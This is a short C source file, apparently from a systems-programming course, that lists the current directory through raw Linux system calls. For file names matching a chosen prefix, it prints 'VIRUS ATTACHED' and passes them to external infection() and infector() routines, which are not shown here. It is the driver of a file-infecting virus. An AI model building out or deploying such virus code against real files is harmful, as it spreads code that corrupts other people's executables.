#include "util.h"

#define SYS_WRITE 4
#define STDOUT 1
#define STDERR 2
#define SYS_OPEN 5
#define O_RDONLY 0
#define SYS_GETDENTS 220
#define BUF_SIZE 8192
#define SYS_CLOSE 6

extern int system_call();
extern void infection();
extern void infector(char *);

struct linux_dirent {
    unsigned long long d_ino;
    unsigned long long d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[];
};

int main(int argc, char *argv[], char *envp[])
{
    int fd, nread, pos, i;
    char buf[BUF_SIZE];
    char prefix = 0;
    struct linux_dirent *entry;
    char *name;

    for (i = 1; i < argc; i++) {
        if (argv[i][0] == '-' && argv[i][1] == 'a') {
            prefix = argv[i][2];
        }
    }

    fd = system_call(SYS_OPEN, ".", O_RDONLY);
    if (fd < 0) {
        system_call(1, 0x55);
    }

    nread = system_call(SYS_GETDENTS, fd, buf, BUF_SIZE);
    if (nread < 0) {
        system_call(1, 0x55);
    }

    pos = 0;
    while (pos < nread) {
        entry = (struct linux_dirent *)(buf + pos);
        name = entry->d_name;

        if (prefix != 0 && name[0] == prefix) {
            system_call(SYS_WRITE, STDOUT, name, strlen(name));
            system_call(SYS_WRITE, STDOUT, " VIRUS ATTACHED\n", 16);
            infection();
            infector(name);
        } else {
            system_call(SYS_WRITE, STDOUT, name, strlen(name));
            system_call(SYS_WRITE, STDOUT, "\n", 1);
        }

        pos += entry->d_reclen;
    }

    system_call(SYS_CLOSE, fd);
    return 0;
}
